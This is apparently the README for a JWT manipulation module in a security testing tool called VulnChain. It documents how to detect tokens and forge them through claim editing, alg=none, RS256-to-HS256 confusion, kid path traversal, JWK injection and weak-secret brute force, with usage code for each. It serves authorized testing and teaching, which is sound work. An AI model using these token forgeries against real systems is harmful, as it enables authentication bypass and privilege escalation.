# JWT Manipulation Module

## Overview

The JWT (JSON Web Token) manipulation module provides comprehensive capabilities for detecting, analyzing, and exploiting JWT-based authentication systems. This module is designed for security testing and CTF competitions.

## Features

### 1. JWT Detection and Inspection

- **Automatic Detection**: Automatically detects JWTs in HTTP headers, cookies, request/response bodies, and query parameters
- **Complete Decoding**: Decodes and displays JWT header and payload claims
- **Location Tracking**: Tracks where JWTs are found (Authorization header, cookies, etc.)

### 2. JWT Tampering

- **Claim Editing**: Modify any claim value in header or payload (e.g., `isAdmin`, `role`, `username`)
- **Algorithm Confusion**: 
  - Change algorithm to `none` to bypass signature verification
  - Change RS256 to HS256 for algorithm confusion attacks
- **Parameter Injection**:
  - Modify `kid` (Key ID) parameter for path traversal attacks
  - Inject `jwk` (JSON Web Key) parameter
- **Signature Manipulation**:
  - Remove signature entirely
  - Sign with custom keys for brute-force attacks

### 3. Automatic JWT Replacement

- **Request Interception**: Automatically replace original JWTs with tampered versions in subsequent requests
- **Multi-location Support**: Replaces JWTs in headers, cookies, and body
- **Session Persistence**: Maintains JWT replacements across multiple requests

### 4. Vulnerability Scanning

- **Algorithm Confusion (none)**: Tests if server accepts `alg=none`
- **Missing Signature**: Tests if server accepts JWTs without signatures
- **Weak Secrets**: Brute-forces common weak signing secrets
- **Kid Injection**: Tests for path traversal in `kid` parameter

## Usage Examples

### Basic JWT Detection

```python
from app.modules.jwt_manipulation import JWTInspector
from app.core.request_handler import RequestHandler

# Initialize
request_handler = RequestHandler()
inspector = JWTInspector(request_handler)

# Send request and detect JWTs
response = await request_handler.send_request(
    method="POST",
    url="https://example.com/login",
    data={"username": "admin", "password": "password"}
)

# Detect JWTs in response
tokens = inspector.detect_jwt_in_response(response)

for token in tokens:
    print(inspector.display_token_info(token))
```

### JWT Tampering

```python
from app.modules.jwt_manipulation import JWTTamperer

tamperer = JWTTamperer()

# Edit a claim
modified_token = tamperer.edit_claim(
    token=original_token,
    claim_name="isAdmin",
    claim_value=True,
    location="payload"
)

# Algorithm confusion attack
none_token = tamperer.algorithm_confusion_none(original_token)

# Modify kid parameter
kid_token = tamperer.modify_kid(
    token=original_token,
    new_kid="../../../dev/null"
)

# Sign with weak secret
signed_token = tamperer.sign_with_key(
    token=original_token,
    key="secret",
    algorithm="HS256"
)
```

### Automatic JWT Replacement

```python
from app.modules.jwt_manipulation import JWTReplacer

replacer = JWTReplacer(request_handler)

# Register replacement
replacer.register_replacement(
    original_token=original_jwt,
    replacement_token=tampered_jwt
)

# All subsequent requests will use the tampered JWT
modified_request = replacer.apply_replacements(original_request)
response = await request_handler.send_request(**modified_request.__dict__)
```

### Vulnerability Scanning

```python
from app.modules.jwt_manipulation import JWTVulnerabilityScanner

scanner = JWTVulnerabilityScanner(request_handler)

# Scan for vulnerabilities
vulnerabilities = await scanner.scan_token(
    token=jwt_token,
    test_url="https://example.com/api/user",
    test_method="GET",
    test_headers={"Authorization": f"Bearer {jwt_token.raw_token}"}
)

for vuln in vulnerabilities:
    print(f"[{vuln.severity.upper()}] {vuln.vulnerability_type}")
    print(f"Description: {vuln.description}")
    print(f"Exploit Token: {vuln.exploit_token}")
```

## Common JWT Attacks

### 1. Algorithm Confusion (alg=none)

Some JWT libraries accept tokens with `alg=none`, effectively disabling signature verification:

```python
# Create token with alg=none
exploit_token = tamperer.algorithm_confusion_none(original_token)
```

### 2. RS256 to HS256 Confusion

If the server uses RS256 (asymmetric) but doesn't properly validate the algorithm, you can change it to HS256 (symmetric) and sign with the public key:

```python
# Change algorithm to HS256
hs256_token = tamperer.algorithm_confusion_hs256(original_token)
```

### 3. Weak Secret Brute-Force

Many applications use weak secrets for signing JWTs:

```python
# The scanner automatically tests common weak secrets
vulnerabilities = await scanner.scan_token(token, test_url)
```

### 4. Kid Parameter Injection

The `kid` (Key ID) parameter can be vulnerable to path traversal:

```python
# Inject malicious kid
exploit_token = tamperer.modify_kid(token, "../../../dev/null")
```

### 5. JWK Injection

Inject your own public key in the JWT header:

```python
# Inject custom JWK
custom_jwk = {
    "kty": "RSA",
    "kid": "custom-key",
    "use": "sig",
    "n": "...",  # Your public key modulus
    "e": "AQAB"
}
exploit_token = tamperer.inject_jwk(token, custom_jwk)
```

## JWT Structure

A JWT consists of three parts separated by dots:

```
header.payload.signature
```

### Header Example
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key-1"
}
```

### Payload Example
```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "isAdmin": false,
  "iat": 1516239022,
  "exp": 1516242622
}
```

## Common Claims

### Standard Claims
- `iss` (Issuer): Who issued the token
- `sub` (Subject): Who the token is about
- `aud` (Audience): Who the token is intended for
- `exp` (Expiration): When the token expires
- `nbf` (Not Before): When the token becomes valid
- `iat` (Issued At): When the token was issued
- `jti` (JWT ID): Unique identifier for the token

### Custom Claims
- `isAdmin`, `admin`, `role`: Authorization claims
- `username`, `email`: User identification
- `permissions`, `scopes`: Access control

## Security Considerations

This module is designed for:
- Authorized security testing
- CTF competitions
- Educational purposes
- Bug bounty programs

**Never use this module against systems without explicit authorization.**

## Requirements

- Python 3.11+
- No external dependencies for basic functionality
- Optional: `cryptography` library for RSA/ECDSA signing

## Integration with VulnChain

The JWT module integrates seamlessly with other VulnChain components:

- **Request Handler**: Automatic JWT detection in all HTTP traffic
- **Session Manager**: JWT persistence across sessions
- **Logging System**: Automatic logging of JWT modifications
- **Report Generator**: Include JWT findings in reports

## References

- [RFC 7519 - JSON Web Token (JWT)](https://tools.ietf.org/html/rfc7519)
- [JWT.io](https://jwt.io/) - JWT debugger
- [OWASP JWT Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
